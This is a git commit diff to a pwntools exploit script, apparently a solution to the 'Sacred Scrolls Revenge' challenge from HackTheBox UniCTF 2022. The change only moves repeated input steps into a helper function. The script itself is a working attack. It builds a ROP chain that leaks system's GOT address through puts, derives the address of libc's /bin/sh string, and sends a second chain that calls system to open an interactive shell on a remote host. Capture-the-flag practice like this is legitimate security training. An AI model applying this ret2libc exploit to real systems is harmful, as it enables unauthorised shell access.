124c71e13eecfaf5445532cefc76c3db2f92a33d
aramya <mdnh@protonmail.com>
2022-12-06 14:32:28 +0100

    Update solve.py

--- hackthebox-unictf-2022/Sacred Scrolls Revenge/solve.py
+++ hackthebox-unictf-2022/Sacred Scrolls Revenge/solve.py
@@ -14,20 +14,26 @@ def bb(b, z):
     with open(z, "r") as f: zipped_data = f.read()
     return base64.b64encode(zipped_data)
 
+def pass_payload(p, payload):
+    p.sendline("Aaa"); sleep(0.5) 
+    p.sendline("1"); sleep(0.5)
+    p.sendline(payload); sleep(0.5)
+    p.sendline("2"); sleep(0.5)
+    p.sendline("3"); sleep(0.5)
+
 elf = ELF("sacred_scrolls")
 
 en_tete = "\xf0\x9f\x91\x93\xe2\x9a\xa1\x00"+"aaaaaaaa"*4
 pop_rdi_ret = 0x4011b3
 ret = 0x4007ce
 
-payload1 = bb(en_tete+p64(pop_rdi_ret)+p64(elf.got["system"])+p64(elf.plt["puts"])+p64(elf.symbols["_start"]),"aleph.zip")
+got_system = elf.got["system"]
+puts_plt = elf.plt["puts"]
+ret2main = elf.symbols["_start"]
+payload1 = bb(en_tete+p64(pop_rdi_ret)+p64(got_system)+p64(puts_plt)+p64(ret2main),"aleph.zip")
 
 p = remote("206.189.118.55", 30649)
-p.sendline("Aaa"); sleep(1)
-p.sendline("1"); sleep(1)
-p.sendline(payload1); sleep(1)
-p.sendline("2"); sleep(1)
-p.sendline("3"); sleep(1)
+pass_payload(p,payload1)
 
 recv1 = p.recv()
 leaked_system = u64(recv1[3525:3531]+"\x00\x00")
@@ -38,10 +44,6 @@ libc_binsh = leaked_system + 1603896
 payload2 = en_tete + p64(ret) + p64(pop_rdi_ret)+p64(libc_binsh)
 payload2 += p64(libc_system)
 payload2 = bb(payload2, "beth.zip")
+pass_payload(p, payload2)
 
-p.sendline("Aaa2"); sleep(1)
-p.sendline("1"); sleep(1)
-p.sendline(payload2); sleep(1)
-p.sendline("2"); sleep(1)
-p.sendline("3")
 p.interactive()
